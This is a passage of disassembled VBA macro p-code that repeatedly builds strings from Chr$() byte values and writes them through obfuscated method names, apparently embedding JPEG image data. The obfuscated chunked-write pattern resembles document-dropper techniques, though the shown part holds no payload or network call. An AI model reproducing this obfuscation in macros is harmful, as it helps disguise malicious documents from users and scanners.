' 	LitDI2 0x0097 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0098 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0099 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x009A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A2 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A3 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A4 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A5 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A6 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A7 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A8 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A9 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B2 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B3 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B4 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B5 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B6 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B7 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B8 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B9 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00BA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C2 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C3 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C4 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C5 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C6 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Like 
' Line #72:
' 	Ld Like 
' 	Paren 
' 	Ld a 
' 	ArgsMemCall Xor 0x0001 
' Line #73:
' 	LitDI2 0x00C7 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x00C8 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C9 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00CA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00D2 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00D3 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00D4 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00D5 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00D6 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00D7 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00D8 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00D9 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00DA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00E1 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00E2 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00E3 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00E4 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00E5 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00E6 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00E7 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00E8 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00E9 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00EA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00F1 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00F2 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00F3 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00F4 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00F5 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00F6 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00F7 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Like 
' Line #74:
' 	Ld Like 
' 	Paren 
' 	Ld a 
' 	ArgsMemCall Xor 0x0001 
' Line #75:
' 	LitDI2 0x00F8 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x00F9 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00FA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00FF 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C4 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x001F 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0003 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0002 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0003 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0004 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0005 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Like 
' Line #76:
' 	Ld Like 
' 	Paren 
' 	Ld a 
' 	ArgsMemCall Xor 0x0001 
' Line #77:
' 	LitDI2 0x0006 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x0007 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0008 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0009 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000B 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00FF 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C4 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B5 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0011 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0002 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0002 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0004 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0004 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0003 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0004 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0007 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0005 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0004 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0004 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0002 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0002 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Like 
' Line #78:
' 	Ld Like 
' 	Paren 
' 	Ld a 
' 	ArgsMemCall Xor 0x0001 
' Line #79:
' 	LitDI2 0x0003 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x0011 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0004 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0005 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0031 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0006 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0012 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0051 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0007 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0071 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0013 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0032 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0081 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0008 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0014 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0042 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0091 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A1 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B1 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C1 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0009 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0023 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0033 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00F0 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0015 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Like 
' Line #80:
' 	Ld Like 
' 	Paren 
' 	Ld a 
' 	ArgsMemCall Xor 0x0001 
' Line #81:
' 	LitDI2 0x0062 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x0072 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00D1 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0016 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0034 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00E1 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0025 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00F1 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0017 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0018 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0019 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x001A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0026 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0028 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0029 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x002A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0035 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0036 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0037 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0038 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0039 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x003A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0043 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0044 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0046 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0047 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Like 
' Line #82:
' 	Ld Like 
' 	Paren 
' 	Ld a 
' 	ArgsMemCall Xor 0x0001 
' Line #83:
' 	LitDI2 0x0048 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x0049 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x004A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0054 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0055 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0056 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0057 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0058 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0059 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x005A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0067 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0068 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x006A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0076 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0078 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0079 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x007A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0082 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0083 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0084 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Like 
' Line #84:
' 	Ld Like 
' 	Paren 
' 	Ld a 
' 	ArgsMemCall Xor 0x0001 
' Line #85:
' 	LitDI2 0x0085 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x0086 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0087 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0088 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0089 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x008A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0092 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0093 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0094 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0095 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0096 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0097 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0098 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0099 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x009A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A2 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A3 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A4 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A5 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A6 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A7 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A8 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A9 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B2 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B3 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B4 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B5 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B6 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B7 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Like 
' Line #86:
' 	Ld Like 
' 	Paren 
' 	Ld a 
' 	ArgsMemCall Xor 0x0001 
' Line #87:
' 	LitDI2 0x00B8 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x00B9 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00BA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C2 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C3 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C4 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C5 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C6 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C7 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C8 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C9 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00CA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00D2 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00D3 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00D4 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00D5 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00D6 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00D7 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00D8 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00D9 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00DA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00E2 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00E3 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00E4 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00E5 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00E6 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00E7 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00E8 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00E9 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00EA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Like 
' Line #88:
' 	Ld Like 
' 	Paren 
' 	Ld a 
' 	ArgsMemCall Xor 0x0001 
' Line #89:
' 	LitDI2 0x00F2 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x00F3 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00F4 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00F5 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00F6 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00F7 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00F8 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00F9 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00FA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00FF 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00DA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000C 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0003 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0002 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0011 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0003 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0011 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x003F 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00E8 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0071 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x001C 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00E6 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A2 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Like 
' Line #90:
' 	Ld Like 
' 	Paren 
' 	Ld a 
' 	ArgsMemCall Xor 0x0001 
' Line #91:
' 	LitDI2 0x00B8 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x009D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0088 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C8 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00E7 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0081 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x004C 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0082 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0019 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B8 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0039 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AC 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00E9 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x001B 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A5 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C9 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0023 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00D0 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0056 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x007D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00FD 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00FC 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B7 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0049 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Like 
' Line #92:
' 	Ld Like 
' 	Paren 
' 	Ld a 
' 	ArgsMemCall Xor 0x0001 
' Line #93:
' 	LitDI2 0x00AB 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x00D9 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0045 
